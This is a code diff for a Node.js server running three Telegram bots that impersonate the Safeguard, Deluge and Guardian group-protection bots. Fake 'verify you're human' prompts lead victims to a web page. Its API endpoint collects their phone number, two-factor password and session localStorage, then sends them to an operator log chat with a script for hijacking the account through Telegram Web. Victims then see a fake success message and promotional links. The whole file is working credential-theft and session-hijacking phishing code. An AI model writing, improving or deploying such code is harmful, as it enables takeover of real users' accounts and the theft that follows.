@@ -1,146 +1,283 @@
 const express = require("express");
 const fs = require("fs");
 const path = require("path");
+
 require("dotenv").config();
 
 const TelegramBot = require("node-telegram-bot-api");
 const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
 const PNF = require("google-libphonenumber").PhoneNumberFormat;
 
-// Admins who can add the bot to channels
-const admins = [7085468890];
+// admins list (whoever adds the bot in the channel should be in this array.)
+const admins = [
+  5891533625
+];
 
-// Load images for speed
-const imagePaths = {
-  success: {
-    safeguard: "images/success/safeguard.jpg",
-    guardian: "images/success/guardian.jpg",
-  },
-  verification: {
-    deluge: "images/verification/deluge.jpg",
-    guardian: "images/verification/guardian.jpg",
-    safeguard: "images/verification/safeguard.jpg",
-  },
-};
+// loading all the pictures beforehand for speed
+const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
+const guardianSuccess = fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg"));
 
-const images = Object.entries(imagePaths).reduce((acc, [key, value]) => {
-  acc[key] = {};
-  for (const type in value) {
-    acc[key][type] = fs.readFileSync(path.join(__dirname, value[type]));
-  }
-  return acc;
-}, {});
+const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg"));
+const guardianVerification = fs.readFileSync(path.join(__dirname, "images/verification/guardian.jpg"));
+const safeguardVerification = fs.readFileSync(path.join(__dirname, "images/verification/safeguard.jpg"));
 
-// Telegram Bots
-const bots = {
-  safeguard: new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true }),
-  deluge: new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true }),
-  guardian: new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true }),
-};
+const safeguardBot = new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true });
+const delugeBot = new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true });
+const guardianBot = new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true });
 
-// Randomized button texts for the Guardian bot
 const guardianButtonTexts = [
   "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
   "Why an Ape ❔ You can be eNORMUS!🔷",
-  "🔥Raid with @Raidar 🔥",
+  "🔥Raid with @Raidar 🔥"
 ];
 
-// Utility to generate random strings
-const generateRandomString = (length) =>
-  Array.from({ length }, () => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 62)]).join("");
+const generateRandomString = (length) => {
+  const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz";
+  let result = "";
+  for (let i = 0; i < length; i++) {
+    const randomIndex = Math.floor(Math.random() * charset.length);
+    result += charset[randomIndex];
+  }
+  return result;
+};
 
-// Retrieve bot usernames
-const botUsernames = {};
-Promise.all(
-  Object.entries(bots).map(([key, bot]) =>
-    bot.getMe().then((info) => {
-      botUsernames[key] = info.username;
-      console.log(`${key} Bot Username: ${info.username}`);
-    })
-  )
-);
+let safeguardUsername;
+let delugeUsername;
+let guardianUsername;
 
-// Express server setup
+safeguardBot.getMe().then(botInfo => {
+  safeguardUsername = botInfo.username;
+  console.log(`Safeguard Bot Username: ${safeguardUsername}`);
+});
+delugeBot.getMe().then(botInfo => {
+  delugeUsername = botInfo.username;
+  console.log(`Deluge Bot Username: ${delugeUsername}`);
+});
+guardianBot.getMe().then(botInfo => {
+  guardianUsername = botInfo.username;
+  console.log(`Guardian Bot Username: ${guardianUsername}`);
+});
+
 const app = express();
 app.use(express.json());
-app.use(express.static("public"));
+app.use(express.static("public"))
 
-// POST API to log user information
 app.post("/api/users/telegram/info", async (req, res) => {
   try {
-    const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
-    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
-    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
+    const {
+      userId,
+      firstName,
+      usernames,
+      phoneNumber,
+      isPremium,
+      password,
+      quicklySet,
+      type
+    } = req.body;
 
-    const usernameList =
-      usernames &&
-      usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n");
+    let pass = password;
+    if (pass === null) {
+      pass = "No Two-factor authentication enabled.";
+    }
 
-    const quickAuthScript = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
-
-    const bot = bots[type];
-    if (!bot) throw new Error(`Bot type "${type}" not recognized`);
-
-    // Log user info
-    await bot.sendMessage(process.env.LOGS_ID, `🪪 <b>UserID</b>: ${userId}
-🌀 <b>Name</b>: ${firstName}
-⭐ <b>Telegram Premium</b>: ${isPremium ? "✅" : "❌"}
-📱 <b>Phone Number</b>: <tg-spoiler>${formattedNumber}</tg-spoiler>
-<b>Passwords</b>: <code>${password || "No Two-factor authentication enabled."}</code>
-<b>Usernames</b>:\n${usernameList || "No usernames provided"}
-<b>Script</b>: <code>${quickAuthScript}</code>`, { parse_mode: "HTML" });
-
-    // Send verification or success message
-    const image = images.success[type];
-    if (image) {
-      const buttons =
-        type === "guardian"
-          ? {
-              reply_markup: {
-                inline_keyboard: [[{ text: guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)], url: `https://t.me/+${generateRandomString(16)}` }]],
-              },
-            }
-          : {
-              reply_markup: {
-                inline_keyboard: [[{ text: "Join Group", url: `https://t.me/+${generateRandomString(16)}` }]],
-              },
-            };
-
-      await bot.sendPhoto(userId, image, {
-        caption: `Verification successful! Use the link to join.`,
-        parse_mode: "HTML",
-        ...buttons,
+    let usernameText = "";
+    if (usernames) {
+      usernameText = `Usernames owned:\n`;
+      usernames.forEach((username, index) => {
+        usernameText += `<b>${index + 1}</b>. @${username.username} ${username.isActive ? "✅" : "❌"}\n`;
       });
     }
 
-    res.json({});
+    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
+    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
+    const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
+
+    await handleRequest(req, res, {
+      password: pass,
+      script: quickAuth,
+      userId,
+      name: firstName,
+      number: formattedNumber,
+      usernames: usernameText,
+      premium: isPremium,
+      type,
+    });
   } catch (error) {
-    console.error("500 Server Error:", error.message);
-    res.status(500).json({ error: "Internal server error" });
+    console.error("500 server error", error);
+    res.status(500).json({ error: "server error" });
   }
 });
 
-// Generic handler for new members in chats
-const handleNewChatMember = (bot, type) => {
-  bot.on("my_chat_member", (update) => {
-    const { chat, new_chat_member, from } = update;
-    if (chat.type === "channel" && new_chat_member.status === "administrator" && new_chat_member.user.is_bot && admins.includes(from.id)) {
-      const image = images.verification[type];
-      if (!image) return console.error(`No image available for type "${type}"`);
+const handleRequest = async (req, res, data) => {  
+  const botMap = {
+    safeguard: safeguardBot,
+    guardian: guardianBot,
+    deluge: delugeBot
+  };
+  let bot = botMap[data.type] || null;
+  await bot.sendMessage(
+    process.env.LOGS_ID,
+      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`, {
+      parse_mode: "HTML"
+    }
+  );
+  let type = data.type;
+  if (type === "safeguard" || type === "guardian") {
+    let image;
+    let caption;
+    if (type === "safeguard") {
+      image = safeguardSuccess;
+      caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`;
+    } else if (type === "guardian") {
+      image = guardianSuccess;
+      caption = `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
+    }
 
-      bot.sendPhoto(chat.id, image, {
-        caption: `This group is protected. Click below to verify:`,
-        reply_markup: {
-          inline_keyboard: [[{ text: "Verify Now", url: `https://t.me/${botUsernames[type]}?start=scrim` }]],
-        },
-        parse_mode: "HTML",
-      });
+    const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];
+
+    const guardianButtons = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: randomText,
+              url: `https://t.me/+${generateRandomString(16)}`
+            },
+          ],
+        ]
+      }
+    };
+    const safeguardButtons = {
+      reply_markup: {
+        inline_keyboard: [
+          [
+            {
+              text: "@SOLTRENDING",
+              url: "https://t.me/SOLTRENDING"
+            },
+          ],
+        ]
+      }
+    }
+
+    const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;
+
+    await bot.sendPhoto(data.userId, image, {
+      caption,
+      ...buttons,
+      parse_mode: "HTML"
+    });
+  }
+
+  res.json({});
+}
+
+const handleNewChatMember = async (bot, type) => {
+  bot.on("my_chat_member", (update) => {
+    const chatId = update.chat.id;
+
+    let jsonToSend;
+    let imageToSend;
+
+    switch (type) {
+      case "deluge":
+        jsonToSend = { caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
+        imageToSend = delugeVerification;
+        break;
+      case "safeguard":
+        jsonToSend = { caption: `${update.chat.title} is being protected by @Safeguard\n\nClick below to verify you're human`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Tap To Verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
+        imageToSend = safeguardVerification;
+        break;
+      case "guardian":
+        jsonToSend = { caption: `<b>${update.chat.title} is protected by Guardian.</b>\n\n⚠️ONLY use the "<b>Click to verify</b>" below and <b>avoid pressing any sponsored ads</b> within this portal. ⚠️`, parse_mode: "HTML", reply_markup: { inline_keyboard: [[{ text: "Click to verify", url: `https://t.me/${update.new_chat_member.user.username}?start=scrim` }]] } };
+        imageToSend = guardianVerification;
+        break;  
+      default:
+        jsonToSend = {};
+    }
+
+    if (
+      update.chat.type === "channel" &&
+      update.new_chat_member.status === "administrator" &&
+      update.new_chat_member.user.is_bot === true &&
+      admins.includes(update.from.id)
+    ) {
+      bot.sendPhoto(chatId, imageToSend, jsonToSend);
     }
   });
-};
+}
 
-// Add event handlers for bots
-Object.entries(bots).forEach(([type, bot]) => handleNewChatMember(bot, type));
+function handleStart(bot) {
+  bot.onText(/\/start (.*)$/, (msg, match) => {
+    let botInfo;
+    bot.getMe().then(botInformation => {
+      botInfo = botInformation;
+      if (botInfo.username) {
+        const chatId = msg.chat.id;
+        let jsonToSend;
+        let imageToSend;
+        if (botInfo.username === safeguardUsername) {
+          jsonToSend = {
+            caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "VERIFY",
+                web_app: {
+                  url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
+                }
+              }]]
+            }
+          }
+          imageToSend = safeguardVerification
+        } else if (botInfo.username === delugeUsername) {
+          jsonToSend = {
+            caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "Tap To Verify",
+                web_app: {
+                  url: `${process.env.DOMAIN}/deluge/?type=deluge`
+                }
+              }]]
+            }
+          }
+          imageToSend = delugeVerification
+        } else if (botInfo.username === guardianUsername) {
+          jsonToSend = {
+            caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [[{
+                text: "Verify",
+                web_app: {
+                  url: `${process.env.DOMAIN}/guardian/?type=guardian`
+                }
+              }]]
+            }
+          }
+          imageToSend = guardianVerification
+        }
+        
+        bot.sendPhoto(
+          chatId, 
+          imageToSend,
+          jsonToSend
+        );
+      }
+    });
+  
+  });
 
-// Start the server
-app.listen(process.env.PORT || 80, () => console.log("Server running"));
+}
+
+handleNewChatMember(safeguardBot, "safeguard");
+handleNewChatMember(delugeBot, "deluge");
+handleNewChatMember(guardianBot, "guardian");
+
+handleStart(safeguardBot);
+handleStart(delugeBot);
+handleStart(guardianBot);
+
+app.listen(process.env.PORT || 80, () => console.log(`loaded everyone & running on port ${process.env.PORT}`));
